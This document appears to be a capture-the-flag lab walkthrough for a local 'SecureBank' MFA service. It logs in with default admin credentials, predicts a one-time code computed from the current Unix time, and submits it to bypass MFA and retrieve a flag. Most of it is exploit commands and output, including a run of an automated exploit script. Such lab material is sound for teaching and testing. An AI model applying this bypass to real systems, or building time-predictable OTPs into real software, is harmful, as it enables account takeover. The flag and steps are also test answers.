# Walkthrough

## Setup

```
cd mfa
docker compose up --build -d
```

Wait for the container to start, then confirm:

```
curl http://localhost:8080/
```

```json
{
  "service": "SecureBank MFA Login v2.0",
  "endpoints": [
    "POST /login   -- {\"username\": \"...\", \"password\": \"...\"}",
    "POST /mfa     -- {\"otp\": \"000000\"} (requires pre_auth cookie)",
    "GET  /flag    -- authenticated session required"
  ]
}
```

## Step 1: Password Login

```
curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"password123"}'
```

```json
{"status": "password accepted", "next": "POST /mfa with your OTP"}
```

The response includes `Set-Cookie: pre_auth=admin`.

## Step 2: Predict and Submit the OTP

The OTP formula is `str(int(time.time()) % 1000000).zfill(6)`. Compute it:

```
python3 -c "import time; print(str(int(time.time()) % 1000000).zfill(6))"
```

```
734521
```

Submit it:

```
curl -s -X POST http://localhost:8080/mfa \
  -H 'Content-Type: application/json' \
  -b 'pre_auth=admin' \
  -c /tmp/jar.txt \
  -d '{"otp": "734521"}'
```

```json
{"status": "authenticated", "next": "GET /flag"}
```

## Step 3: Retrieve the Flag

```
curl -s http://localhost:8080/flag -b /tmp/jar.txt
```

```json
{"flag": "POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}"}
```

## Automated

```
python3 exploit/exploit.py http://localhost:8080
```

Output:

```
[*] Target: http://localhost:8080
[*] Step 1: submitting credentials...
    HTTP 200: password accepted
    Cookie: pre_auth=admin
[*] Step 2: predicted OTP = 734521
    HTTP 200: authenticated
    Cookie: session=<token>
[*] Step 3: retrieving flag...
[*] Flag: POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}
```
